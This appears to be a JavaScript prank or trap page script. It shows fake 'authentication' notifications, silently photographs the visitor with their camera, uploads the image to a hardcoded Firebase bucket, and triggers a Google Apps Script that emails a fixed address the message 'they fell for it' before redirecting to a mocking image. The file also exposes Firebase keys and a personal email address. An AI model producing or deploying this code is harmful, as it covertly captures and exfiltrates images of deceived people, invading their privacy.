        var GmailUrl = "https://script.google.com/macros/s/AKfycbzrviU1NrKxhJ9MbnNN40p23nIXjcubyYn5AShJ3SPXb9XY94Can7Vm4JJsI_JoHMcn/exec";



// Firebaseの構成情報
const firebaseConfig = {
   apiKey: "AIzaSyDGHRQsE7-YH0UxEJ8FvdShUr3_k3AoMQM",
    authDomain: "ip-add-47c83.firebaseapp.com",
    databaseURL: "https://ip-add-47c83-default-rtdb.firebaseio.com",
    projectId: "ip-add-47c83",
    storageBucket: "ip-add-47c83.appspot.com",
    messagingSenderId: "711426693718",
    appId: "1:711426693718:web:258764df678e37350779f7",
};

// Firebase初期化
async function initializeFirebase() {
  try {
    // FirebaseのJavaScript SDKを動的に読み込む
    const firebaseModule = await import("https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js");
    const storageModule = await import("https://www.gstatic.com/firebasejs/9.0.2/firebase-storage.js");

    // Firebase初期化
    const { initializeApp } = firebaseModule;
    const firebaseApp = initializeApp(firebaseConfig);

    // Firebase Storage インスタンスを作成
    const storage = storageModule.getStorage(firebaseApp);

    // カメラを開く処理を実行
    openCameraAndUpload(storage, storageModule);
  } catch (error) {
    console.error("Firebase初期化に失敗しました:", error);
  }
}



// ブラウザが通知をサポートしているか確認
if ('Notification' in window) {
  // 通知の許可が必要かどうかを確認
  if (Notification.permission === 'default') {
    // ユーザーに通知の許可を求める
    Notification.requestPermission().then(function (permission) {
      if (permission === 'granted') {
        console.log('通知が許可されました！');
        // 通知を作成する例
        var notification = new Notification('認証確認', {
          body: '認証しました',
        });
      } else {
        console.warn('通知が拒否されました。');
      }
    });
  } else if (Notification.permission === 'granted') {
    // すでに通知が許可されている場合
    console.log('通知は既に許可されています。');
    // 通知を作成する例
    var notification = new Notification('認証', {
      body: '認証が確認されました',
    });
  } else {
    console.warn('通知が拒否されています。');
  }
} else {
  console.error('このブラウザは通知をサポートしていません。');
}





// 内カメラにアクセスする関数
async function openCameraAndUpload(storage, storageModule) {
  try {
    // メディアデバイスからストリームを取得
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    // ビデオ要素を作成してストリームをセット
    const videoElement = document.createElement("video");
    videoElement.srcObject = stream;

    // ビデオを再生
    videoElement.play().then(() => {
      // Canvasを作成して画像をキャプチャ
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

      // 現在の日時からファイル名を生成
      const currentDate = new Date();
      const fileName = `${currentDate.getFullYear()}-${currentDate.getMonth() + 1}-${currentDate.getDate()}-${currentDate.getHours()}-${currentDate.getMinutes()}.png`;

      const capturedImage = canvas.toDataURL("image/png");

      // Firebase Storageに画像をアップロード
const imageRef = storageModule.ref(storage, `/cameradata/${fileName}`);
      const uploadTask = storageModule.uploadString(imageRef, capturedImage, "data_url");

      uploadTask.then(() => {
        console.log("画像が正常にアップロードされました。");
         GAS();
      }).catch((error) => {
        console.error("画像のアップロードに失敗しました:", error);
      });

      // ストリームが終了したらカメラを停止
      stream.getVideoTracks()[0].onended = () => {
        console.log("カメラが停止しました。");
            window.location.href='https://www.google.com/imgres?imgurl=https%3A%2F%2Fd1i1cacvxo8yjc.cloudfront.net%2Fresize_thumbnail%3Ftoken%3DeyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfcGF0aCI6ImRpZ2l0YWxfcHJvZHVjdF90aHVtYm5haWxzL3RodW1ibmFpbHMvMTk4NThfMmM5Yjg5NGYtYmQxNy00YjI3LWE1OTYtYTQ1N2M5ZDVhZjMxLnBuZyIsIm91dHB1dF9mb3JtYXQiOiJqcGVnIiwib3V0cHV0X3NpemUiOnsid2lkdGgiOjUwMCwiaGVpZ2h0Ijo1MDB9fQ.YDRCnzENVAff6_UbLu9MYKu5ORGTOiD6OA1jikXHtU4&tbnid=f4xohK7g0QRp7M&vet=12ahUKEwj_zujpue-CAxV7rlYBHVlwBAwQMygFegQIARB8..i&imgrefurl=https%3A%2F%2Fsuzuri.jp%2Finunekojigoku%2Fdigital_products%2F10672&docid=avuFb-URFk8dyM&w=370&h=320&q=%E3%81%82%E3%81%8A%E3%82%8A%E7%94%BB%E5%83%8F&ved=2ahUKEwj_zujpue-CAxV7rlYBHVlwBAwQMygFegQIARB8'

      };
    }).catch((error) => {
      console.error("ビデオの再生に失敗しました:", error);
    });
  } catch (error) {
    console.error("カメラにアクセスできませんでした:", error);
  }
}

// Firebase初期化を実行
initializeFirebase();


function GAS() {
            // Use fetch to send the data to GAS for Gmail sending
            fetch(`${GmailUrl}?locationInfo=引っかかりました&additionalInfo=$https://console.firebase.google.com/u/0/project/ip-add-47c83/storage/ip-add-47c83.appspot.com/files/~2Fcameradata?hl=ja&recipientEmail=hiroto20080208@gmail.com`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Network response was not ok`);
                    }
                    return response.text();
                })
}



